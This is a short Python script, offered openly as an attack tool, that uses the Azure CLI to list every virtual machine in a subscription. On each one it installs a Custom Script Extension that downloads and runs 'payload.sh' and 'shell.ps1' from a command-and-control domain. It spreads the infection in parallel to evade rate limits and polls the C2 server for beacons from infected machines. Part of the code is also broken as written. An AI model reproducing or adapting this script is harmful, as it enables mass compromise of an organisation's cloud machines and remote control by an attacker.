#!/usr/bin/env python3
import requests, subprocess, json, time, threading
from concurrent.futures import ThreadPoolExecutor

C2_DOMAIN = "yourc2.com"
AZURE_SUB = "your-sub-id"

def infect_vm(vm_id):
    """Deploy payload to single VM via Custom Script Extension"""
    cmd = f'''
    az vm extension set \\
      --publisher Microsoft.Azure.Extensions \\
      --version 2.0 \\
      --name CustomScript \\
      --resource-group {vm_id.split("/")[4]} \\
      --vm-name {vm_id.split("/")[8]} \\
      --settings '{{"fileUris":["https://{C2_DOMAIN}/payload.sh","https://{C2_DOMAIN}/shell.ps1"],"commandToExecute":"bash payload.sh"}}'
    '''
    subprocess.run(cmd, shell=True)

# Harvest all VMs in subscription
vms = json.loads(subprocess.check_output(["az", "vm", "list", "--query", "[].id"])).strip('[]\n').split('\n')
print(f"Found {len(vms)} VMs to infect...")

# Parallel propagation (evade rate limits)
with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(infect_vm, vms)

# Monitor C2 beacons
def beacon_listener():
    while True:
        beacons = requests.get(f"https://{C2_DOMAIN}/api/beacons").json()
        for beacon in beacons:
            print(f"✅ Infected: {beacon['vm']} @ {beacon['ip']}")
        time.sleep(60)

threading.Thread(target=beacon_listener, daemon=True).start()
